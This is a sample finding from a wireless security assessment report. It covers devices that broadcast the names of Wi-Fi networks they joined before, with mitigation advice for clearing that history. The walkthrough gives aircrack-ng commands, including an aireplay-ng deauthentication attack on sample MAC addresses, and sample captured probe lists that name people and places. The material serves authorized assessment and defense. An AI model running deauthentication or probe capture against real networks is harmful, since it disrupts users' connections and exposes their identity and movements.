
Title

5.2.1 Device broadcasts previously used WiFi network names
Priority

Medium
Summary

Each wireless device maintains a “memory” of what networks it has successfully connected to. When it is connecting to a network, it sends out “probes” to all of the networks it has in this memory. These probes can reveal personal, organizational, and locational information that, taken in context, can be dangerous or lead to other vulnerabilities.

It is important to note that this data gets broadcast widely, and can be collected without any network access, only proximity to the device.
Description

Before attempting to gain internal access to the wireless network, it can be valuable to to listen to the wireless traffic as close to the physical office location as possible, even without knowing anything about the network itself. This outside, passive information gathering can reveal a surprising amount of data on not only what devices are connecting to which networks, but what other networks those devices have historically connected to.

These network probes can often contain names (especially from mobile phone tethers), organizational affiliations, and a mixture of other potentially valuable data (home network names, recent airports, cafés and conference networks). If there are many networks in the office’s vicinity, this will help identify the specific office network (if there is any doubt).
MitigationTitle

Cleanse wifi network connection history
MitigationDescription

For most devices, deleting networks from the “saved” network list will stop them from being probed. Obviously, this can be an annoyance for networks you regularly connect to, so renaming these networks to non-revealing names would help, as would creating non-name-associated “guest” networks for colleagues connecting to your home network.

Making sure that mobile hotspots/tethers do not broadcast your name is useful for many reasons.

On iPhones and iPads, it is not possible to selectively remove historical networks unless you are currently in range of that network.

It is however possible to remove all history: go to Settings > General > Reset > Reset Network Settings . When you take this step, it is worth going through this reset multiple times – approximately once per year of device ownership, as the first reset appears to only remove recently-connected networks, and older networks will be broadcast.
Assets affected by this issue

    5.2 Wireless leakage assessment (1 instance)

Evidence for 5.2 Wireless leakage assessment
Title

5.2.1 [sample evidence] Device broadcasts previously used WiFi network names [STUB]
Walkthrough

You should disconnect from any wifi network you may be connected to to capture the widest amount of data.

Step 1: Switch your wireless adapter to monitor mode

$ airmon-ng start <interface>

Step 2: Listen for wifi probes. Run airodump-ng on the monitor mode interface (usually mon0). This listens to wifi beacons and you can begin analyzing who is on what network, and see historical networks. Leave this running in a separate window for the duration of your visit.

airodunmp-ng mon0

Step 3: Send de-authentication packets to force clients to reconnect and send out additional probes

$ aireplay-ng -0 1 -a 00:11:A1:20:39:26 -c 0F:3E:DF:DA:2D:E2 mon0 

 15:54:48  Waiting for beacon frame (BSSID: 00:11:A1:20:39:26) on channel 1
 15:54:49  Sending 64 directed DeAuth. STMAC: [0F:3E:DF:DA:2D:E2] [ 5| 3 ACKs]

Step 3: Watch what probes the various devices are sending out (especially when they are deauthenticated, as above). You will see each computer on the network, as identified by their mac addresses, broadcast information about previous networks to which they have connected.

BSSID              STATION            PWR   Rate    Lost    Frames Probe                                                              
00:11:A1:20:39:26	0F:3E:DF:DA:2D:E2	-67	0	0	234567	SampleOrg,home,linksys¸John Smith's iPhone,Free Public Wifi
00:11:A1:20:39:26	F8:7E:FC:03:CC:43	-80	-24	0	234567	amygreen,SampleOrg,android-hotspot,Starbucks,united_club,Dulles Airport WiFi
00:11:A1:20:39:26	F8:19:F3:DF:75:19	-58	-54	0	234567	SampleOrg
00:11:A1:20:39:26	38:08:95:EB:7E:0B	-75	-12	0	234567	HolidayInn,SampleOrg,John Smith's Mac mini,android-hotspot

